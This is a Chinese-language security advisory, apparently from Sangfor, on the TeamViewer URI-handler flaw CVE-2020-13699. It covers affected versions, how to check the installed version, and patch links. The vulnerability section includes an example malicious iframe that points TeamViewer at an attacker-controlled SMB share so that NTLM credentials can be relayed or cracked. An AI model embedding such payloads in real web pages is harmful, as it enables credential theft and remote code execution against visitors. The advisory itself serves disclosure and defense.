@@ -1,0 +1,74 @@
+## **一、** ** **漏洞概要****
+
+2020年8月6日，TeamViewer官方发布了TeamViewer
+URL处理的风险通告。TeamViewer存在未引用的搜索路径或元素的安全缺陷，由于应用程序没有正确引用它的自定义URI处理程序，当安装了TeamViewer的易受攻击版本的用户访问恶意创建的网站时，可能会被黑客利用。深信服安全研究团队依据漏洞重要性和影响力进行评估，作出漏洞通告。
+
+# **二、** ** **漏洞分析****
+
+### ****2.1**** ** **TeamViewer**** ** **介绍****
+
+TeamViewer是由德国公司TeamViewer GmbH开发的应用程序，可用于Windows，macOS，Linux，Chrome
+OS，iOS，Android，Windows RT Windows Phone 8和BlackBerry操作系统。
+
+它主要用于远程访问和控制各种类型的计算机系统和移动设备，但也提供协作和演示功能（例如，桌面共享，Web会议，文件传输等）。
+
+### ****2.2**** ** **漏洞描述****
+
+TeamViewer存在未引用的搜索路径或元素的安全缺陷，由于应用程序没有正确引用它的自定义URI处理程序，当安装有TeamViewer的易受攻击版本的系统访问恶意创建的网站时，可能会被利用。
+
+攻击者可以使用精心制作的URL（iframe src='teamviewer10: --play \\\attacker-IP\share\fake.tvs'）将恶意iframe嵌入网站中，从而启动TeamViewer Windows桌面客户端并强制其打开远程SMB共享。
+
+Windows将在打开SMB共享时，执行NTLM身份验证，并且可以转发该请求（使用如响应程序之类的工具）以执行代码（或捕获该请求以进行哈希破解）。
+
+该漏洞的利用可以远程启动，并且不需要事先进行身份验证，是水坑攻击的理想选择。
+
+## **三、** ** **影响范围****
+
+【影响版本】
+
+TeamViewer < 8.0.258861
+
+TeamViewer < 9.0.28860
+
+TeamViewer < 10.0.258873
+
+TeamViewer < 11.0.258870
+
+TeamViewer < 12.0.258869
+
+TeamViewer < 13.2.36220
+
+TeamViewer < 14.2.56676
+
+TeamViewer < 15.8.3
+
+# **四、** ** **解决方案****
+
+### ****4.1**** ** **检测方案****
+
+打开TeamViewer -> 点击按钮帮助 -> 点击按钮关于TeamViewer -> 查看TeamViewer版本号。
+
+![](https://image.3001.net/images/20200811/1597114111.png!small)
+
+以确保TeamViewer的版本是非漏洞版本。
+
+### ****4.2 修复方案****
+
+针对此漏洞官方已在8.0.258861、9.0.258860、10.0.258873、11.0.258870、12.0.258869、13.2.36220、14.2.56676、14.7.48350和15.8.3版本中修复。
+
+请受影响的用户参考以下链接安装补丁更新：<https://www.teamviewer.com/en/download/previous-versions/>
+
+# **五、** ** **时间轴****
+
+2020/8/6 TeamViewer发布通告
+
+2020/8/10 深信服千里目安全实验室发布通告
+
+# **六、** ** **参考链接****
+
+<https://www.helpnetsecurity.com/2020/08/06/cve-2020-13699/>
+
+<https://community.teamviewer.com/t5/Announcements/Statement-on-CVE-2020-13699/td-p/98448>
+
+<https://jeffs.sh/CVEs/CVE-2020-13699.txt>
+
